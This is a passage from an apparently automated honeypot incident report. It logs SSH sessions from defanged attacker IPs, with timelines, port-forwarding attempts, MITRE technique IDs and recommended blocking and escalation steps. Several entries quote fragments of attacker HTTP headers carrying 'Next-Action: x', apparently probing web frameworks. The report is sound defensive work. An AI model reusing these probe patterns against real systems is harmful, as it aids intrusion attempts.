- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1ff83cd353c

| Field | Detail |
|---|---|
| **Source IP** | `103.68.22[.]140` |
| **First Seen** | 2026-07-10 20:19 |
| **Last Seen** | 2026-07-10 20:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:19:40` | `cowrie.session.connect` |
| `2026-07-10 20:19:41` | `cowrie.client.version` |
| `2026-07-10 20:19:41` | `cowrie.client.kex` |
| `2026-07-10 20:19:43` | `cowrie.login.success` |
| `2026-07-10 20:19:44` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:19:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.68.22[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.68.22[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-434e6bfd99a9

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-10 20:20 |
| **Last Seen** | 2026-07-10 20:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:20:23` | `cowrie.session.connect` |
| `2026-07-10 20:20:23` | `cowrie.client.version` |
| `2026-07-10 20:20:23` | `cowrie.client.kex` |
| `2026-07-10 20:20:23` | `cowrie.login.success` |
| `2026-07-10 20:20:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b04281f652b

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-10 20:20 |
| **Last Seen** | 2026-07-10 20:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:20:23` | `cowrie.session.connect` |
| `2026-07-10 20:20:23` | `cowrie.client.version` |
| `2026-07-10 20:20:23` | `cowrie.client.kex` |
| `2026-07-10 20:20:23` | `cowrie.login.success` |
| `2026-07-10 20:20:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba8f2f7bb736

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-10 20:20 |
| **Last Seen** | 2026-07-10 20:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:20:29` | `cowrie.session.connect` |
| `2026-07-10 20:20:29` | `cowrie.client.version` |
| `2026-07-10 20:20:29` | `cowrie.client.kex` |
| `2026-07-10 20:20:29` | `cowrie.login.success` |
| `2026-07-10 20:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85a0c34cb09e

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-10 20:20 |
| **Last Seen** | 2026-07-10 20:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:20:30` | `cowrie.session.connect` |
| `2026-07-10 20:20:30` | `cowrie.client.version` |
| `2026-07-10 20:20:30` | `cowrie.client.kex` |
| `2026-07-10 20:20:30` | `cowrie.login.success` |
| `2026-07-10 20:20:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e13527c8193

| Field | Detail |
|---|---|
| **Source IP** | `41.65.118[.]172` |
| **First Seen** | 2026-07-10 20:23 |
| **Last Seen** | 2026-07-10 20:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:23:47` | `cowrie.session.connect` |
| `2026-07-10 20:23:47` | `cowrie.client.version` |
| `2026-07-10 20:23:47` | `cowrie.client.kex` |
| `2026-07-10 20:23:49` | `cowrie.login.success` |
| `2026-07-10 20:23:49` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.65.118[.]172` to AbuseIPDB if not already reported
- [ ] Block `41.65.118[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51ab44a8dba7

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]55` |
| **First Seen** | 2026-07-10 20:23 |
| **Last Seen** | 2026-07-10 20:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:23:54` | `cowrie.session.connect` |
| `2026-07-10 20:23:55` | `cowrie.client.version` |
| `2026-07-10 20:23:55` | `cowrie.client.kex` |
| `2026-07-10 20:23:57` | `cowrie.login.success` |
| `2026-07-10 20:23:57` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:24:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]55` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74f24e09adb0

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]136` |
| **First Seen** | 2026-07-10 20:28 |
| **Last Seen** | 2026-07-10 20:29 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 522, Connection: close, User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0[.]0 Safari/537.36, Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:28:47` | `cowrie.session.connect` |
| `2026-07-10 20:28:48` | `cowrie.login.success` |
| `2026-07-10 20:28:48` | `cowrie.session.params` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.failed` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.failed` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.failed` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.failed` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.failed` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.failed` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.failed` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.failed` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.failed` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.failed` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.failed` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.input` |
| `2026-07-10 20:28:48` | `cowrie.command.failed` |
| `2026-07-10 20:28:49` | `cowrie.command.input` |
| `2026-07-10 20:28:49` | `cowrie.command.failed` |
| `2026-07-10 20:29:00` | `cowrie.log.closed` |
| `2026-07-10 20:29:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]136` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64c554be592d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.210[.]132` |
| **First Seen** | 2026-07-10 20:28 |
| **Last Seen** | 2026-07-10 20:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:28:58` | `cowrie.session.connect` |
| `2026-07-10 20:28:59` | `cowrie.client.version` |
| `2026-07-10 20:28:59` | `cowrie.client.kex` |
| `2026-07-10 20:29:02` | `cowrie.login.success` |
| `2026-07-10 20:29:03` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.210[.]132` to AbuseIPDB if not already reported
- [ ] Block `144.22.210[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f35ef36a1739

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]136` |
| **First Seen** | 2026-07-10 20:29 |
| **Last Seen** | 2026-07-10 20:29 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 513, Connection: close, User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136., Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:29:01` | `cowrie.session.connect` |
| `2026-07-10 20:29:01` | `cowrie.login.success` |
| `2026-07-10 20:29:01` | `cowrie.session.params` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.failed` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.failed` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.failed` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.failed` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.failed` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.failed` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.failed` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.failed` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.failed` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.failed` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.failed` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.failed` |
| `2026-07-10 20:29:01` | `cowrie.command.input` |
| `2026-07-10 20:29:01` | `cowrie.command.failed` |
| `2026-07-10 20:29:12` | `cowrie.log.closed` |
| `2026-07-10 20:29:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]136` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9607b21ea157

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]136` |
| **First Seen** | 2026-07-10 20:29 |
| **Last Seen** | 2026-07-10 20:29 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 512, Connection: close, User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0[.]0 Safari/537.36 Edg/134.0.0[.]0, Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:29:12` | `cowrie.session.connect` |
| `2026-07-10 20:29:12` | `cowrie.login.success` |
| `2026-07-10 20:29:12` | `cowrie.session.params` |
| `2026-07-10 20:29:12` | `cowrie.command.input` |
| `2026-07-10 20:29:12` | `cowrie.command.failed` |
| `2026-07-10 20:29:12` | `cowrie.command.input` |
| `2026-07-10 20:29:12` | `cowrie.command.failed` |
| `2026-07-10 20:29:12` | `cowrie.command.input` |
| `2026-07-10 20:29:12` | `cowrie.command.input` |
| `2026-07-10 20:29:12` | `cowrie.command.failed` |
| `2026-07-10 20:29:12` | `cowrie.command.input` |
| `2026-07-10 20:29:12` | `cowrie.command.failed` |
| `2026-07-10 20:29:12` | `cowrie.command.input` |
| `2026-07-10 20:29:12` | `cowrie.command.failed` |
| `2026-07-10 20:29:13` | `cowrie.command.input` |
| `2026-07-10 20:29:13` | `cowrie.command.failed` |
| `2026-07-10 20:29:13` | `cowrie.command.input` |
| `2026-07-10 20:29:13` | `cowrie.command.failed` |
| `2026-07-10 20:29:13` | `cowrie.command.input` |
| `2026-07-10 20:29:13` | `cowrie.command.input` |
| `2026-07-10 20:29:13` | `cowrie.command.failed` |
| `2026-07-10 20:29:13` | `cowrie.command.input` |
| `2026-07-10 20:29:13` | `cowrie.command.failed` |
| `2026-07-10 20:29:13` | `cowrie.command.input` |
| `2026-07-10 20:29:13` | `cowrie.command.input` |
| `2026-07-10 20:29:13` | `cowrie.command.input` |
| `2026-07-10 20:29:13` | `cowrie.command.input` |
| `2026-07-10 20:29:13` | `cowrie.command.failed` |
| `2026-07-10 20:29:13` | `cowrie.command.input` |
| `2026-07-10 20:29:13` | `cowrie.command.failed` |
| `2026-07-10 20:29:13` | `cowrie.command.input` |
| `2026-07-10 20:29:13` | `cowrie.command.input` |
| `2026-07-10 20:29:13` | `cowrie.command.failed` |
| `2026-07-10 20:29:13` | `cowrie.command.input` |
| `2026-07-10 20:29:13` | `cowrie.command.failed` |
| `2026-07-10 20:29:24` | `cowrie.log.closed` |
| `2026-07-10 20:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]136` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0209f5ed3b49

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]136` |
| **First Seen** | 2026-07-10 20:29 |
| **Last Seen** | 2026-07-10 20:29 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 518, Connection: close, User-Agent: Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30, Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:29:24` | `cowrie.session.connect` |
| `2026-07-10 20:29:24` | `cowrie.login.success` |
| `2026-07-10 20:29:25` | `cowrie.session.params` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.failed` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.failed` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.failed` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.failed` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.failed` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.failed` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.failed` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.failed` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.failed` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.failed` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.failed` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.failed` |
| `2026-07-10 20:29:25` | `cowrie.command.input` |
| `2026-07-10 20:29:25` | `cowrie.command.failed` |
| `2026-07-10 20:29:36` | `cowrie.log.closed` |
| `2026-07-10 20:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]136` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8572219ae24

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]136` |
| **First Seen** | 2026-07-10 20:29 |
| **Last Seen** | 2026-07-10 20:29 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 513, Connection: close, User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0[.]0 Safari/537.36, Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:29:37` | `cowrie.session.connect` |
| `2026-07-10 20:29:37` | `cowrie.login.success` |
| `2026-07-10 20:29:37` | `cowrie.session.params` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.failed` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.failed` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.failed` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.failed` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.failed` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.failed` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.failed` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.failed` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.failed` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.failed` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.failed` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.failed` |
| `2026-07-10 20:29:37` | `cowrie.command.input` |
| `2026-07-10 20:29:37` | `cowrie.command.failed` |
| `2026-07-10 20:29:49` | `cowrie.log.closed` |
| `2026-07-10 20:29:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]136` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a476badcae1

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]136` |
| **First Seen** | 2026-07-10 20:29 |
| **Last Seen** | 2026-07-10 20:30 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 522, Connection: close, User-Agent: Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30, Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:29:49` | `cowrie.session.connect` |
| `2026-07-10 20:29:49` | `cowrie.login.success` |
| `2026-07-10 20:29:50` | `cowrie.session.params` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.failed` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.failed` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.failed` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.failed` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.failed` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.failed` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.failed` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.failed` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.failed` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.failed` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.failed` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.failed` |
| `2026-07-10 20:29:50` | `cowrie.command.input` |
| `2026-07-10 20:29:50` | `cowrie.command.failed` |
| `2026-07-10 20:30:01` | `cowrie.log.closed` |
| `2026-07-10 20:30:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]136` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e29dae78e0c

| Field | Detail |
|---|---|
| **Source IP** | `62.201.212[.]54` |
| **First Seen** | 2026-07-10 20:30 |
| **Last Seen** | 2026-07-10 20:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:30:36` | `cowrie.session.connect` |
| `2026-07-10 20:30:36` | `cowrie.client.version` |
| `2026-07-10 20:30:36` | `cowrie.client.kex` |
| `2026-07-10 20:30:37` | `cowrie.login.success` |
| `2026-07-10 20:30:38` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:30:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.212[.]54` to AbuseIPDB if not already reported
- [ ] Block `62.201.212[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-085435166778

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-10 20:30 |
| **Last Seen** | 2026-07-10 20:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:30:47` | `cowrie.session.connect` |
| `2026-07-10 20:30:48` | `cowrie.client.version` |
| `2026-07-10 20:30:48` | `cowrie.client.kex` |
| `2026-07-10 20:30:49` | `cowrie.login.success` |
| `2026-07-10 20:30:50` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:30:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-010cd6eda189

| Field | Detail |
|---|---|
| **Source IP** | `31.41.84[.]98` |
| **First Seen** | 2026-07-10 20:32 |
| **Last Seen** | 2026-07-10 20:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:32:27` | `cowrie.session.connect` |
| `2026-07-10 20:32:28` | `cowrie.client.version` |
| `2026-07-10 20:32:28` | `cowrie.client.kex` |
| `2026-07-10 20:32:29` | `cowrie.login.success` |
| `2026-07-10 20:32:29` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:32:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.41.84[.]98` to AbuseIPDB if not already reported
